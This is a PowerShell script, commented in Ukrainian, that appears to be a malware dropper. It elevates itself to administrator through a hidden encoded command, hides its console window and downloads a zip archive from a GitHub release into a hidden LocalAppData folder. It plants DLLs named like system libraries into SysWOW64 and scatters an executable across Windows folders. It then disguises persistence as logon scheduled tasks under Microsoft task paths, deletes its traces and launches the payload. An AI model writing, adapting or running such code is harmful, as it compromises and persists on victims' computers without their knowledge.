$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-NOT $isAdmin) {
    $code = $MyInvocation.MyCommand.ScriptBlock.ToString()

    if ([string]::IsNullOrWhiteSpace($code)) {
        exit 1
    }

    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
    Start-Process powershell -Verb RunAs -ArgumentList `
        "-NoProfile","-ExecutionPolicy","Bypass","-WindowStyle","Hidden","-EncodedCommand",$encoded
    exit
}

# --- Приховування вікна консолі ---
Add-Type -Namespace Win32 -Name NativeMethods -MemberDefinition @"
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@

$consolePtr = [Win32.NativeMethods]::GetConsoleWindow()
if ($consolePtr -ne [IntPtr]::Zero) {
    [Win32.NativeMethods]::ShowWindow($consolePtr, 0) | Out-Null  # 0 = SW_HIDE
}
# ----------------------------------

$scriptRoot = $PSScriptRoot
if (-not $scriptRoot) {
    $cmdPath = $MyInvocation.MyCommand.Path
    if ($cmdPath) {
        $scriptRoot = Split-Path -Parent $cmdPath
    }
}
if (-not $scriptRoot) {
    $scriptRoot = (Get-Location).Path
}

$hiddenDirPath = Join-Path $env:LOCALAPPDATA 'ViaCache'

if (-not (Test-Path -Path $hiddenDirPath)) {
    New-Item -ItemType Directory -Path $hiddenDirPath -Force | Out-Null
}
Set-ItemProperty -Path $hiddenDirPath -Name Attributes `
    -Value ([System.IO.FileAttributes]::Hidden)

Set-Location -Path $hiddenDirPath

$version  = "v2.3"
$zipUrl   = "https://github.com/ScavyXYZ/Via/releases/download/$version/Via.zip"
$zipName  = "Via.zip"

$downloadOk = $false

try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipName -ErrorAction Stop
    $downloadOk = $true
}
catch { }

if ($downloadOk -and (Test-Path $zipName)) {
    try {
        Expand-Archive -Path $zipName -DestinationPath "." -Force -ErrorAction Stop
    }
    catch { }

    try {
        Remove-Item -Path $zipName -Force -ErrorAction Stop
    }
    catch { }
}

$exeName         = "MPcrash.exe"
$exeInDirectory  = "CrashTask.exe"
$dllNames        = @("winrsi.dll", "ws2_64.dll")
$sysWow64        = Join-Path $env:WINDIR "SysWOW64"

if (-not (Test-Path $sysWow64)) {
    return
}

foreach ($dll in $dllNames) {
    $src = Join-Path (Get-Location) $dll
    $dst = Join-Path $sysWow64 $dll

    if (-not (Test-Path $src)) {
        continue
    }

    try {
        Copy-Item -Path $src -Destination $dst -Force -ErrorAction Stop
    }
    catch { }
}

$paths = Get-ScheduledTask |
    Where-Object {
        $_.TaskPath -like '\Microsoft\Windows\*' -and
        $_.Actions.CimClass.CimClassName -contains 'MSFT_TaskExecAction'
    } |
    Select-Object -ExpandProperty TaskPath -Unique

$task_names = $paths | ForEach-Object {
    "$(($_ -split '\\')[-2]) CrashTask"
}

$root  = 'C:\Windows'
$depth = 3

$allFolders = Get-ChildItem -Path $root -Directory -Recurse -ErrorAction SilentlyContinue |
    Where-Object {
        $relative = $_.FullName.Substring($root.Length).Trim('\')
        ($relative -split '\\').Count -eq $depth
    }

$count    = $task_names.Count
$selected = $allFolders |
    Select-Object -ExpandProperty FullName |
    Get-Random -Count ([Math]::Min($count, ($allFolders | Measure-Object).Count))

$exePath = Join-Path (Get-Location) $exeName

if (-not (Test-Path $exePath)) {
    return
}

$copied = @()

foreach ($folder in $selected) {
    $dest = Join-Path $folder $exeInDirectory
    try {
        Copy-Item -Path $exePath -Destination $dest -Force -ErrorAction Stop
        $copied += $dest
    }
    catch { }
}

$pairCount = [Math]::Min($paths.Count, $copied.Count)

for ($i = 0; $i -lt $pairCount; $i++) {
    $taskPath   = $paths[$i]
    $taskName   = $task_names[$i]
    $exeForTask = $copied[$i]

    $fullTaskName = "$taskPath$taskName"

    if (Get-ScheduledTask -TaskName $taskName -TaskPath $taskPath -ErrorAction SilentlyContinue) {
        continue
    }

    schtasks /create `
        /tn "$fullTaskName" `
        /tr "`"$exeForTask`"" `
        /sc onlogon `
        /rl highest `
        /f | Out-Null
}

if (Test-Path $exePath) {
    try {
        Remove-Item -Path $exePath -Force -ErrorAction Stop
    }
    catch { }
}

if ($copied.Count -gt 0) {
    $launchExe = $copied | Get-Random

    if (Test-Path $launchExe) {
        try {
            Start-Process -FilePath $launchExe -ErrorAction Stop
        }
        catch { }
    }
}